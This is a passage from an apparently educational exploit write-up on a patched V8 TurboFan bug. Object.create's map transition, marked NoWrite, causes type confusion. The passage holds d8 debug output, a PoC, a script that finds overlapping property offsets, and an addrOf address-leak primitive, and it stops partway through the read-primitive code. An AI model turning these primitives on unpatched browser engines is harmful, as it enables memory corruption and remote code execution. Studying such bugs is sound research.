+  V(CreateObject, Operator::kNoProperties, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)                       \
   V(ObjectIsArray, Operator::kNoProperties, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)                      \
   V(HasProperty, Operator::kNoProperties, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>)                        \
   V(HasInPrototypeChain, Operator::kNoProperties, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>)                \
diff --git a/test/mjsunit/compiler/regress<span class="hljs-number">-888923.</span>js b/test/mjsunit/compiler/regress<span class="hljs-number">-888923.</span>js
<span class="hljs-keyword">new</span> file mode <span class="hljs-number">100644</span>
...</code></pre>
<p><code>NoWrite</code> means &#x201C;the object&#x2019;s state will not be mutated&#x201D; (i.e., no additional memory updates). During this operation there was a side effect that changed the properties&#x2019; layout (the Map), so the fix was to indicate &#x201C;this object&#x2019;s properties do not change&#x201D; to prevent the optimizer from assuming the Map is unmodified.</p>
<h3 id="Code-Review"><a href="#Code-Review" class="headerlink" title="Code Review"></a>Code Review</h3><p>When you call <code>Object.create(proto)</code> in JavaScript, it creates a new object and directly sets that object&#x2019;s <code>[[Prototype]]</code> to <code>proto</code>.</p>
<p>For example:</p>
<pre><code class="hljs jsx"><span class="hljs-keyword">let</span> animal = { <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;animal&quot;</span> };
<span class="hljs-keyword">let</span> dog = <span class="hljs-built_in">Object</span>.create(animal);
<span class="hljs-built_in">console</span>.log(dog.type); <span class="hljs-comment">// &quot;animal&quot;</span>
</code></pre>
<p>Here <code>dog</code> does not have its own <code>type</code> property, but because its <code>[[Prototype]]</code> points to <code>animal</code>, <code>dog.type</code> resolves to <code>&quot;animal&quot;</code>. Thus <code>Object.create</code> acts as a &#x201C;glue&#x201D; that starts a new prototype chain.</p>
<blockquote>
<p>JavaScript objects and the prototype chain</p>
<ul>
<li>Every object in JavaScript internally has a hidden link called <code>[[Prototype]]</code>.</li>
<li>This link points to another object (the prototype), which may in turn have its own prototype.</li>
<li>The linked sequence forms the <strong>prototype chain</strong>.</li>
<li>When JS looks up a property or method:<ol>
<li>It checks the object itself.</li>
<li>If not found, it follows <code>[[Prototype]]</code> upwards.</li>
<li>It repeats until it reaches <code>null</code>.</li>
</ol>
</li>
</ul>
</blockquote>
<p><img src="image%202.png" srcset="/img/loading.gif" alt="image.png"></p>
<p>Let&#x2019;s follow how the <code>ObjectCreate</code> function constructs a new map. The <code>ObjectCreate</code> function takes the prototype as an argument and calls <code>GetObjectCreateMap</code>.</p>
<p><img src="image%203.png" srcset="/img/loading.gif" alt="image.png"></p>
<p><code>GetObjectCreateMap</code>&#x2019;s job is to <strong>return the Object Create Map appropriate for the given prototype</strong>. This is where a side effect can occur.</p>
<ol>
<li><code>JSObject::OptimizeAsPrototype</code>: Converts the given object into a &#x201C;prototype-optimized&#x201D; state &#x2014; i.e., transforms a regular object into a prototype object.</li>
<li><code>Map::TransitionToPrototype</code>: Transitions the map to match the new prototype &#x2014; in other words, it changes the map&#x2019;s linkage/structure.</li>
</ol>
<p>This matters because the code is effectively doing &#x201C;the newly created object becomes a prototype object, and the map associated with that object is changed at the same time.&#x201D; Therefore, simply calling <code>Object.create(proto)</code> can cause <strong>the object to become a prototype object and its associated map layout to change</strong>.</p>
<h3 id="Practice"><a href="#Practice" class="headerlink" title="Practice"></a>Practice</h3><p>Now let&#x2019;s verify this in <code>d8</code>.</p>
<pre><code class="hljs c">C:\dev\source\v8&gt;out\x64.debug\d8 --allow-natives-syntax
V8 version <span class="hljs-number">14.2</span><span class="hljs-number">.0</span> (candidate)
d8&gt; let obj = {x:<span class="hljs-number">13</span>};
undefined
d8&gt; %DebugPrint(obj)
DebugPrint: <span class="hljs-number">0x21700389515</span>: [JS_OBJECT_TYPE]
 - <span class="hljs-built_in">map</span>: <span class="hljs-number">0x02170006c2fd</span> &lt;Map[<span class="hljs-number">16</span>](HOLEY_ELEMENTS)&gt; [FastProperties]
 - prototype: <span class="hljs-number">0x0217000545fd</span> &lt;Object <span class="hljs-built_in">map</span> = <span class="hljs-number">0000021700053979</span>&gt;
 - elements: <span class="hljs-number">0x0217000007bd</span> &lt;FixedArray[<span class="hljs-number">0</span>]&gt; [HOLEY_ELEMENTS]
 - properties: <span class="hljs-number">0x0217000007bd</span> &lt;FixedArray[<span class="hljs-number">0</span>]&gt;
 - All own properties (excluding elements): {
    <span class="hljs-number">0x21700003601</span>: [String] in ReadOnlySpace: #x: <span class="hljs-number">13</span> (<span class="hljs-keyword">const</span> data field <span class="hljs-number">0</span>, attrs: [WEC]) @ Any, location: in-object
 }
<span class="hljs-number">0x2170006c2fd</span>: [Map] in OldSpace
 - <span class="hljs-built_in">map</span>: <span class="hljs-number">0x021700053419</span> &lt;MetaMap (<span class="hljs-number">0x021700053469</span> &lt;NativeContext[<span class="hljs-number">300</span>]&gt;)&gt;
 - type: JS_OBJECT_TYPE
 - instance size: <span class="hljs-number">16</span>  
 - inobject properties: <span class="hljs-number">1</span>
 - unused property fields: <span class="hljs-number">0</span>
 - elements kind: HOLEY_ELEMENTS
 - <span class="hljs-keyword">enum</span> length: invalid
 - stable_map
 - back pointer: <span class="hljs-number">0x02170006c2d5</span> &lt;Map[<span class="hljs-number">16</span>](HOLEY_ELEMENTS)&gt;
 - prototype_validity_cell: <span class="hljs-number">0x021700000ac9</span> &lt;Cell value= [cleared]&gt;
 - instance descriptors (own) #<span class="hljs-number">1</span>: <span class="hljs-number">0x021700389525</span> &lt;DescriptorArray[<span class="hljs-number">1</span>]&gt;
 - prototype: <span class="hljs-number">0x0217000545fd</span> &lt;Object <span class="hljs-built_in">map</span> = <span class="hljs-number">0000021700053979</span>&gt;
 - constructor: <span class="hljs-number">0x021700053e91</span> &lt;JSFunction Object (sfi = <span class="hljs-number">0000021700351</span>A15)&gt;
 - dependent code: <span class="hljs-number">0x0217000007cd</span> &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;
 - construction counter: <span class="hljs-number">0</span>

{x: <span class="hljs-number">13</span>}</code></pre>
<p>An object like the one above is created. Now call <code>Object.create</code>.</p>
<pre><code class="hljs c">d8&gt; Object.create(obj)
{}
d8&gt; %DebugPrint(obj)
DebugPrint: <span class="hljs-number">0x21700389515</span>: [JS_OBJECT_TYPE]
 - <span class="hljs-built_in">map</span>: <span class="hljs-number">0x02170006d05d</span> &lt;Map[<span class="hljs-number">16</span>](HOLEY_ELEMENTS)&gt; [DictionaryProperties]
 - prototype: <span class="hljs-number">0x0217000545fd</span> &lt;Object <span class="hljs-built_in">map</span> = <span class="hljs-number">0000021700053979</span>&gt;
 - elements: <span class="hljs-number">0x0217000007bd</span> &lt;FixedArray[<span class="hljs-number">0</span>]&gt; [HOLEY_ELEMENTS]
 - properties: <span class="hljs-number">0x02170038b3dd</span> &lt;NameDictionary[<span class="hljs-number">18</span>]&gt;
 - All own properties (excluding elements): {
   x: <span class="hljs-number">13</span> (data, dict_index: <span class="hljs-number">1</span>, attrs: [WEC])
 }
<span class="hljs-number">0x2170006d05d</span>: [Map] in OldSpace
 - <span class="hljs-built_in">map</span>: <span class="hljs-number">0x021700053419</span> &lt;MetaMap (<span class="hljs-number">0x021700053469</span> &lt;NativeContext[<span class="hljs-number">300</span>]&gt;)&gt;
 - type: JS_OBJECT_TYPE
 - instance size: <span class="hljs-number">16</span>
 - inobject properties: <span class="hljs-number">1</span>
 - unused property fields: <span class="hljs-number">0</span>
 - elements kind: HOLEY_ELEMENTS
 - <span class="hljs-keyword">enum</span> length: invalid
 - dictionary_map
 - may_have_interesting_properties
 - prototype_map
 - prototype info: <span class="hljs-number">0x02170006d085</span> &lt;PrototypeInfo&gt;
 - prototype_validity_cell: <span class="hljs-number">0x021700000ac9</span> &lt;Cell value= [cleared]&gt;
 - instance descriptors (own) #<span class="hljs-number">0</span>: <span class="hljs-number">0x0217000007e5</span> &lt;DescriptorArray[<span class="hljs-number">0</span>]&gt;
 - prototype: <span class="hljs-number">0x0217000545fd</span> &lt;Object <span class="hljs-built_in">map</span> = <span class="hljs-number">0000021700053979</span>&gt;
 - constructor: <span class="hljs-number">0x021700053e91</span> &lt;JSFunction Object (sfi = <span class="hljs-number">0000021700351</span>A15)&gt;
 - dependent code: <span class="hljs-number">0x0217000007cd</span> &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;
 - construction counter: <span class="hljs-number">0</span>

{x: <span class="hljs-number">13</span>}</code></pre>
<p>After the function call, you can see the map changed from <code>FastProperties</code> to <code>DictionaryProperties</code>. That means the <code>NoWrite</code> assumption is invalid. If there is no operation checking the map before and after the function call, that can lead to Type Confusion.</p>
<h2 id="2-2-Proof-of-Concept"><a href="#2-2-Proof-of-Concept" class="headerlink" title="2.2 Proof of Concept"></a>2.2 Proof of Concept</h2><h3 id="Type-Confusion-PoC"><a href="#Type-Confusion-PoC" class="headerlink" title="Type Confusion PoC"></a>Type Confusion PoC</h3><pre><code class="hljs c"><span class="hljs-function">function <span class="hljs-title">vuln</span><span class="hljs-params">(obj)</span> </span>{
    <span class="hljs-comment">// Access Property a of obj, forcing a CheckMap operation</span>
    obj.a;

    <span class="hljs-comment">// Force a Map Transition via our side-effect</span>
    Object.create(obj)

    <span class="hljs-comment">// Trigger our type-confusion by accessing an out-of-bound property</span>
    <span class="hljs-keyword">return</span> obj.b;
}

vuln({a:<span class="hljs-number">42</span>, b:<span class="hljs-number">43</span>}); <span class="hljs-comment">// Warm-up code</span>
vuln({a:<span class="hljs-number">42</span>, b:<span class="hljs-number">43</span>});
%OptimizeFunctionOnNextCall(vuln); <span class="hljs-comment">// JIT Compile vuln</span>
vuln({a:<span class="hljs-number">42</span>, b:<span class="hljs-number">43</span>}); <span class="hljs-comment">// Trigger type-confusion - should not return 43!</span></code></pre>
<p>Let&#x2019;s trigger Type Confusion using <code>Object.create</code>. Run <code>d8</code> with the <code>--allow-natives-syntax</code> flag and enter the following:</p>
<pre><code class="hljs css"><span class="hljs-selector-tag">d8</span>&gt; <span class="hljs-selector-tag">vuln</span>({<span class="hljs-attribute">a</span>:<span class="hljs-number">42</span>, b:<span class="hljs-number">43</span>})
43
<span class="hljs-selector-tag">d8</span>&gt; <span class="hljs-selector-tag">vuln</span>({<span class="hljs-attribute">a</span>:<span class="hljs-number">42</span>, b:<span class="hljs-number">43</span>})
43
<span class="hljs-selector-tag">d8</span>&gt; %<span class="hljs-selector-tag">OptimizeFunctionOnNextCall</span>(<span class="hljs-selector-tag">vuln</span>)
<span class="hljs-selector-tag">undefined</span>
<span class="hljs-selector-tag">d8</span>&gt; <span class="hljs-selector-tag">vuln</span>({<span class="hljs-attribute">a</span>:<span class="hljs-number">42</span>, b:<span class="hljs-number">43</span>})
0</code></pre>
<p>In the optimized (compiled) code you can observe that the return value differs.</p>
<p>If you look at the IR graph,</p>
<pre><code class="hljs c">C:\dev\v8\v8\out\x64.debug&gt;d8 --allow-natives-syntax --trace-turbo poc.js
Concurrent recompilation has been disabled <span class="hljs-keyword">for</span> tracing.
---------------------------------------------------
Begin compiling method vuln <span class="hljs-keyword">using</span> Turbofan
---------------------------------------------------
Finished compiling method vuln <span class="hljs-keyword">using</span> Turbofan</code></pre>
<p><img src="image%204.png" srcset="/img/loading.gif" alt="image.png"></p>
<p>You can see that redundancy elimination removed the <code>CheckMaps</code> at node 46 on the left. At that point, when execution passes through <code>JSCreateObject</code> at node 28, a map transition can occur &#x2014; and that is where Type Confusion can be triggered.</p>
<h3 id="Five-Steps-to-generate-a-Proof-of-Concept"><a href="#Five-Steps-to-generate-a-Proof-of-Concept" class="headerlink" title="Five Steps to generate a Proof of Concept"></a>Five Steps to generate a Proof of Concept</h3><p>After triggering the Type Confusion as described above, the exploit uses the side effect that occurs when accessing the object. The access phase can be divided into five steps.</p>
<ol>
<li>Create the prototype object: make a new object with in-object (inline) properties. This object will be used as the prototype for <code>Object.create</code>.</li>
<li>Add an out-of-line property: add a property to the object&#x2019;s property backing store. This property will be accessed after the Map transition.</li>
<li>Force <code>CheckMap</code> execution: run the <code>CheckMap</code> operation to encourage redundancy elimination. This causes later <code>CheckMap</code> operations to be removed.</li>
<li>Induce a Map transition: call <code>Object.create</code> using the object created earlier. This changes the object&#x2019;s structure and transitions it to a new hidden class (Map).</li>
<li>Access the out-of-line property: finally, access the out-of-line property.</li>
</ol>
<blockquote>
<p><strong>In-object properties (Inline properties)</strong></p>
<p>Inline properties are stored directly in the object&#x2019;s memory. Because no extra memory indirection is required when accessing them, they&#x2019;re the fastest and most efficient storage. V8 uses the object&#x2019;s Map (hidden class) to compute the precise offset of each inline property.</p>
<p><strong>Out-of-line properties (Out-of-line / backing store properties)</strong></p>
<p>When an object has more properties than fit in its inline property slots, the remaining properties are stored out-of-line in a separate backing store (property backing store). Accessing these properties requires an extra level of indirection compared to inline properties.</p>
<p><strong>Speculation Guard</strong></p>
<p><code>CheckMap</code> is an operation that verifies an object&#x2019;s hidden class matches the expected one; it serves as a speculation guard. The JIT compiler analyzes runtime patterns and speculates that a variable&#x2019;s type will remain constant, then generates optimized code based on that assumption. <code>CheckMap</code> confirms whether that speculation still holds.</p>
</blockquote>
<p>Words alone may be unclear, so let&#x2019;s inspect the code in the next section.</p>
<h2 id="2-3-Exploiting-a-Type-Confusion"><a href="#2-3-Exploiting-a-Type-Confusion" class="headerlink" title="2.3 Exploiting a Type Confusion"></a>2.3 <strong>Exploiting a Type Confusion</strong></h2><h3 id="Map-Transition"><a href="#Map-Transition" class="headerlink" title="Map Transition"></a>Map Transition</h3><p>In section 2.2 we used <code>%OptimizeFunctionOnNextCall</code>, which lets a developer force optimization timing. Instead, we&#x2019;ll let V8 decide when to optimize by making the function hot through repeated calls. As we&#x2019;ve seen, ordinary JavaScript goes through V8&#x2019;s optimization pipeline: when V8 deems a function &#x201C;hot,&#x201D; it uses the JIT compilers (Maglev, TurboFan) to generate optimized native code for it.</p>
<pre><code class="hljs c"><span class="hljs-function">function <span class="hljs-title">vuln</span><span class="hljs-params">(obj)</span> </span>{
  <span class="hljs-comment">// Access Property a of obj, forcing a CheckMap operation</span>
  obj.a;

  <span class="hljs-comment">// Force a Map Transition via our side-effect</span>
  Object.create(obj)

  <span class="hljs-comment">// Trigger our type-confusion by accessing an out-of-bound property</span>
  <span class="hljs-keyword">return</span> obj.b;
}

<span class="hljs-keyword">for</span> (let i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {
  let obj = {a:<span class="hljs-number">42</span>}; <span class="hljs-comment">// Create object with in-line properties</span>
  obj.b = <span class="hljs-number">43</span>; <span class="hljs-comment">// Store property out-of-line in backing store</span>
  <span class="hljs-keyword">if</span> (i = <span class="hljs-number">1</span>) { %DebugPrint(obj); }
  vuln(obj); <span class="hljs-comment">// Trigger type-confusion</span>
  <span class="hljs-keyword">if</span> (i = <span class="hljs-number">9999</span>) { %DebugPrint(obj); }
}</code></pre>
<p>Save the above code to a JSON file and run it with <code>d8</code>; you&#x2019;ll get results like the screenshot below.</p>
<p><img src="image%205.png" srcset="/img/loading.gif" alt="image.png"></p>
<ul>
<li>The object&#x2019;s Map (which holds its layout) changed from <code>FastProperties</code> to <code>DictionaryProperties</code>.</li>
<li>(The bottom of the image is slightly cut off,) but you can also see that the property backing store transitioned from a <code>FixedArray</code> to a <code>NameDictionary</code>.</li>
</ul>
<blockquote>
<p>V8 stores an object&#x2019;s excess properties (those that overflow inline slots) in a separate memory area called the property backing store. This backing store is implemented as a <strong>FixedArray</strong> called <strong>PropertyArray</strong>. Thus, the <strong>PropertyArray</strong> can be seen as a special-purpose <strong>FixedArray</strong> used to hold an object&#x2019;s out-of-line properties.</p>
</blockquote>
<p><code>FixedArray</code> and <code>NameDictionary</code> are composed as follows:</p>
<p><img src="image%206.png" srcset="/img/loading.gif" alt="image.png"></p>
<p>FixedArray (PropertyArray) is a simple array structure with contiguous value slots. It stores an object&#x2019;s out-of-line (those that exceed the inline slots) property <strong>values in order</strong>. A simplified layout looks like:</p>
<pre><code class="hljs gherkin">FixedArray:
[ header |<span class="hljs-string"> slot0 </span>|<span class="hljs-string"> slot1 </span>|<span class="hljs-string"> slot2 </span>|<span class="hljs-string"> slot3 </span>|<span class="hljs-string"> ... ]</span></code></pre>
<p>NameDictionary stores (key, value, details) tuples in a hashtable/dictionary form. Because it must keep the property name, value, and property attributes (details) together, its structure is more complex. The per-process hash seed (randomness) is mixed in, so the placement of keys in the table changes on every run. In short, NameDictionary is a complicated hash-table structure whose property storage locations are randomized each execution, making them hard to predict. A simplified layout looks like:</p>
<pre><code class="hljs gherkin">NameDictionary:
[ header |<span class="hljs-string"> ... </span>|<span class="hljs-string"> key0 </span>|<span class="hljs-string"> value0 </span>|<span class="hljs-string"> details0 </span>|<span class="hljs-string"> key1 </span>|<span class="hljs-string"> value1 </span>|<span class="hljs-string"> details1 </span>|<span class="hljs-string">...]</span></code></pre>
<p>So &#x2014; what side effects can happen if properties of different types get confused?</p>
<p>When properties that used to be stored sequentially in a <code>FixedArray</code> (<code>0</code>, <code>1</code>, <code>2</code>, &#x2026;) are converted to a <code>NameDictionary</code>, they end up scattered at completely different memory offsets. The JIT-compiled code, however, was generated assuming the <code>FixedArray</code> offsets. If execution continues using those fixed <code>FixedArray</code> offsets while the backing store is actually a <code>NameDictionary</code>, you end up accessing entirely different fields &#x2014; sometimes those fields will accidentally line up so that a different property appears to be at the same offset. By triggering this situation you can gain an exploitable primitive.</p>
<p>As shown above, hot code produced by repeating a pattern causes the JIT compiler to assume a fixed map and generate native code that accesses properties at fixed offsets. For example, <code>obj.p10</code> may be compiled to read from <code>base + offset + 10*8</code>. If that compiled code remains and you trigger a map transition at runtime, the object&#x2019;s map can change from <code>FastProperties</code> &#x2192; <code>DictionaryProperties</code>, swapping the backing store from a <code>FixedArray</code> to a <code>NameDictionary</code>. But the JIT code doesn&#x2019;t know about the change and keeps reading at the fixed <code>FixedArray</code> offsets. Because the two layouts place fields differently, <strong>the same read will end up reading some other field</strong> in memory.</p>
<h3 id="Finding-Overlapping-Properties"><a href="#Finding-Overlapping-Properties" class="headerlink" title="Finding Overlapping Properties"></a>Finding Overlapping Properties</h3><pre><code class="hljs c"><span class="hljs-comment">// Create object with one inline and 31 out-of-line properties</span>
<span class="hljs-function">function <span class="hljs-title">makeObj</span><span class="hljs-params">()</span> </span>{
    let obj = {<span class="hljs-keyword">inline</span>: <span class="hljs-number">1234</span>};
    <span class="hljs-keyword">for</span> (let i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">32</span>; i++) {
        Object.defineProperty(obj, <span class="hljs-string">&apos;p&apos;</span> + i, {
            writable: <span class="hljs-literal">true</span>,
            value: -i
        });
    }
    <span class="hljs-keyword">return</span> obj;
}</code></pre>
<p>First, this creates an object with one inline property (<code>inline</code>) and 31 out-of-line properties (<code>p1</code> ~ <code>p31</code>). We plant negative values in each out-of-line property so that, when we later dump memory, we can clearly identify only the values we inserted (they won&#x2019;t be confused with small positive dictionary-internal values). The single inline access like <code>obj.inline</code> exists so the JIT will generate a <code>CheckMap</code> and form the assumption &#x201C;this object has this map.&#x201D; In other words, the <code>obj.inline</code> access causes a <strong>map-check</strong> inside <code>vuln()</code>. After we cause the map transition, the JIT will keep using the old assumption and Type Confusion occurs.</p>
<p>Let&#x2019;s look at the full PoC that finds overlapping property pairs.</p>
<pre><code class="hljs c"><span class="hljs-comment">// Create object with one inline and 31 out-of-line properties</span>
<span class="hljs-function">function <span class="hljs-title">makeObj</span><span class="hljs-params">()</span> </span>{
    let obj = {<span class="hljs-keyword">inline</span>: <span class="hljs-number">1234</span>};
    <span class="hljs-keyword">for</span> (let i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">32</span>; i++) {
        Object.defineProperty(obj, <span class="hljs-string">&apos;p&apos;</span> + i, {
            writable: <span class="hljs-literal">true</span>,
            value: -i
        });
    }
    <span class="hljs-keyword">return</span> obj;
}

<span class="hljs-comment">// Find a pair of properties where p1 is stored at the same offset</span>
<span class="hljs-comment">// in the FixedArray as p2 is in the NameDictionary</span>
<span class="hljs-function">function <span class="hljs-title">findOverlappingProperties</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-comment">// Create an array of all 32 property names such as p1..p32</span>
    let pNames = [];
    <span class="hljs-keyword">for</span> (let i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) {
        pNames[i] = <span class="hljs-string">&apos;p&apos;</span> + i;
    }

    <span class="hljs-comment">// Create eval of our vuln function that will generate code during runtime</span>
    eval(`
    function vuln(obj) {
      <span class="hljs-comment">// Access Property inline of obj, forcing a CheckMap operation</span>
      obj.<span class="hljs-keyword">inline</span>;
      <span class="hljs-comment">// Force a Map Transition via our side-effect</span>
      <span class="hljs-keyword">this</span>.Object.create(obj);
      <span class="hljs-comment">// Trigger our type-confusion by accessing out-of-bound properties</span>
      ${pNames.<span class="hljs-built_in">map</span>((p) =&gt; `let ${p} = obj.${p};`).join(<span class="hljs-string">&apos;\n&apos;</span>)}
      return [${pNames.join(&apos;, &apos;)}];
    }
  `)

    <span class="hljs-comment">// JIT code to trigger vuln</span>
    <span class="hljs-keyword">for</span> (let i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {
        let res = vuln(makeObj());
        <span class="hljs-comment">// Print FixedArray when i=1 and Dictionary when i=9999</span>
        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">1</span> || i == <span class="hljs-number">9999</span>) {
            print(res);
        }
    }
}

print(<span class="hljs-string">&quot;[+] Finding Overlapping Properties&quot;</span>);
findOverlappingProperties();</code></pre>
<p>The vulnerable <code>vuln()</code> function dynamically generates code at runtime (using <code>eval</code> and template literals) that reads <code>p1</code>~<code>p31</code> and returns them as an array. This avoids manually writing many read statements and forces the JIT to produce code that reads many properties at once; repeated execution triggers profiling and then optimization into code that uses fixed offsets.</p>
<p>The search strategy is as follows: plant many candidate properties, run the function many times to make it hot so the JIT compiles it, then deliberately force a map transition and compare the read results before and after the transition. Indices where the results differ identify candidate overlapping locations.</p>
<p><img src="image%207.png" srcset="/img/loading.gif" alt="image.png"></p>
<blockquote>
<p>Note: In <code>../v8</code> (a recent checkout) you can verify that the bug is no longer reproducible.</p>
</blockquote>
<p>By running the same object shape thousands of times to drive JIT compilation, then intentionally causing the map transition and comparing reads in the FixedArray vs NameDictionary states, you can find where the negative values moved &#x2014; those indices are candidates. From those candidates, discard trivial cases where <code>pX</code> overlaps with itself; keep only pairs where different properties collide (<code>pA &#x2194; pB</code>) and verify they match. The code above is a full PoC that finds overlapping property pairs.</p>
<pre><code class="hljs c"><span class="hljs-comment">// Function that creates an object with one in-line and 32 out-of-line properties</span>
<span class="hljs-function">function <span class="hljs-title">makeObj</span><span class="hljs-params">()</span> </span>{
    let obj = {<span class="hljs-keyword">inline</span>: <span class="hljs-number">1234</span>};
    <span class="hljs-keyword">for</span> (let i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">32</span>; i++) {
        Object.defineProperty(obj, <span class="hljs-string">&apos;p&apos;</span> + i, {
            writable: <span class="hljs-literal">true</span>,
            value: -i
        });
    }
    <span class="hljs-keyword">return</span> obj;
}

<span class="hljs-comment">// Function that finds a pair of properties where p1 is stored at the same offset</span>
<span class="hljs-comment">// in the FixedArray as p2 in the NameDictionary</span>
let p1, p2;

<span class="hljs-function">function <span class="hljs-title">findOverlappingProperties</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-comment">// Create an array of all 32 property names such as p1..p32</span>
    let pNames = [];
    <span class="hljs-keyword">for</span> (let i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) {
        pNames[i] = <span class="hljs-string">&apos;p&apos;</span> + i;
    }

    <span class="hljs-comment">// Create eval of our vuln function that will generate code during runtime</span>
    eval(`
    function vuln(obj) {
      <span class="hljs-comment">// Access Property inline of obj, forcing a CheckMap operation</span>
      obj.<span class="hljs-keyword">inline</span>;
      <span class="hljs-comment">// Force a Map Transition via our side-effect</span>
      <span class="hljs-keyword">this</span>.Object.create(obj);
      <span class="hljs-comment">// Trigger our type-confusion by accessing out-of-bound properties</span>
      ${pNames.<span class="hljs-built_in">map</span>((p) =&gt; `let ${p} = obj.${p};`).join(<span class="hljs-string">&apos;\n&apos;</span>)}
      return [${pNames.join(&apos;, &apos;)}];
    }
  `)

    <span class="hljs-comment">// JIT code to trigger vuln</span>
    <span class="hljs-keyword">for</span> (let i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {
        <span class="hljs-comment">// Create Object and pass it to Vuln function</span>
        let res = vuln(makeObj());
        <span class="hljs-comment">// Look for overlapping properties in results</span>
        <span class="hljs-keyword">for</span> (let i = <span class="hljs-number">1</span>; i &lt; res.length; i++) {
            <span class="hljs-comment">// If i is not the same value, and res[i] is between -32 and 0, it overlaps</span>
            <span class="hljs-keyword">if</span> (i !== -res[i] &amp;&amp; res[i] &lt; <span class="hljs-number">0</span> &amp;&amp; res[i] &gt; <span class="hljs-number">-32</span>) {
                [p1, p2] = [i, -res[i]];
                <span class="hljs-keyword">return</span>;
            }
        }
    }
    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;[!] Failed to find overlapping properties&quot;</span>;
}

print(<span class="hljs-string">&quot;[+] Finding Overlapping Properties...&quot;</span>);
findOverlappingProperties();
print(`[+] Properties p${p1} <span class="hljs-keyword">and</span> p${p2} overlap!`);</code></pre>
<p><img src="image%208.png" srcset="/img/loading.gif" alt="image.png"></p>
<p>As mentioned, NameDictionary&#x2019;s property placement is randomized at runtime, so you must discover pairs dynamically like this. Now that we have such a pair, let&#x2019;s see how to use it to get Read/Write primitives!</p>
<h3 id="The-addrOf-Read-Primitive"><a href="#The-addrOf-Read-Primitive" class="headerlink" title="The addrOf Read Primitive"></a>The addrOf Read Primitive</h3><p>Create an inline object that stores a <code>double</code> and then create another object that will be stored in the backing store, then trigger the Type Confusion. The result is that an object pointer gets interpreted as a <code>double</code>.</p>
<pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addrOf</span>(<span class="hljs-params"></span>) </span>{
    <span class="hljs-comment">// 1. Dynamically generate vuln function (bypass Map check)</span>
    <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span>
<span class="hljs-string">    function vuln(obj) {</span>
<span class="hljs-string">      obj.inline;</span>
<span class="hljs-string">      this.Object.create(obj);</span>
<span class="hljs-string">      // We expect p1 to be a Double, but actually p2 (an Object pointer) is loaded</span>
<span class="hljs-string">      return obj.p<span class="hljs-subst">${p1}</span>.x; </span>
<span class="hljs-string">    }</span>
<span class="hljs-string">  `</span>);

    <span class="hljs-keyword">let</span> obj = {<span class="hljs-attr">z</span>: <span class="hljs-number">1234</span>}; <span class="hljs-comment">// the target object whose address we want</span>
    <span class="hljs-keyword">let</span> pValues = [];
    pValues[p1] = {<span class="hljs-attr">x</span>: <span class="hljs-number">13.37</span>}; <span class="hljs-comment">// Double (expected type)</span>
    pValues[p2] = {<span class="hljs-attr">y</span>: obj}; <span class="hljs-comment">// Object (actually loaded value)</span>

    <span class="hljs-comment">// 2. Drive JIT optimization and induce type confusion</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {
        <span class="hljs-keyword">let</span> res = vuln(makeObj(pValues));
        <span class="hljs-comment">// If the return value is not 13.37 (i.e., an address leaked), success</span>
        <span class="hljs-keyword">if</span> (res != <span class="hljs-number">13.37</span>) {
            <span class="hljs-keyword">return</span> res.toBigInt() - <span class="hljs-number">1n</span>; <span class="hljs-comment">// return address and remove tag</span>
        }
    }
    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;[!] AddrOf Primitive Failed&quot;</span>
}
</code></pre>
<p>Below is the Read Primitive code that includes the function above (if you want the pointer untagging logic, replace with the function above).</p>
<pre><code class="hljs c"><span class="hljs-comment">// Function that creates an object with one in-line and 32 out-of-line properties</span>
<span class="hljs-function">function <span class="hljs-title">makeObj</span><span class="hljs-params">(pValues)</span> </span>{
    let obj = {<span class="hljs-keyword">inline</span>: <span class="hljs-number">1234</span>};
    <span class="hljs-keyword">for</span> (let i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) {
        Object.defineProperty(obj, <span class="hljs-string">&apos;p&apos;</span> + i, {
            writable: <span class="hljs-literal">true</span>,
            value: pValues[i]
        });
    }
    <span class="hljs-keyword">return</span> obj;
}
<span class="hljs-comment">// Function that finds a pair of properties where p1 is stored at the same offset</span>
<span class="hljs-comment">// in the FixedArray as p2 in the NameDictionary</span>
let p1, p2;

<span class="hljs-function">function <span class="hljs-title">findOverlappingProperties</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-comment">// Create an array of all 32 property names such as p1..p32</span>
    let pNames = [];
    <span class="hljs-keyword">for</span> (let i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) {
        pNames[i] = <span class="hljs-string">&apos;p&apos;</span> + i;
    }

    <span class="hljs-comment">// Create eval of our vuln function that will generate code during runtime</span>
    eval(`
    function vuln(obj) {
      <span class="hljs-comment">// Access Property inline of obj, forcing a CheckMap operation</span>
      obj.<span class="hljs-keyword">inline</span>;
      <span class="hljs-comment">// Force a Map Transition via our side-effect</span>
      <span class="hljs-keyword">this</span>.Object.create(obj);
      <span class="hljs-comment">// Trigger our type-confusion by accessing out-of-bound properties</span>
      ${pNames.<span class="hljs-built_in">map</span>((p) =&gt; `let ${p} = obj.${p};`).join(<span class="hljs-string">&apos;\n&apos;</span>)}
      return [${pNames.join(&apos;, &apos;)}];
    }
  `)

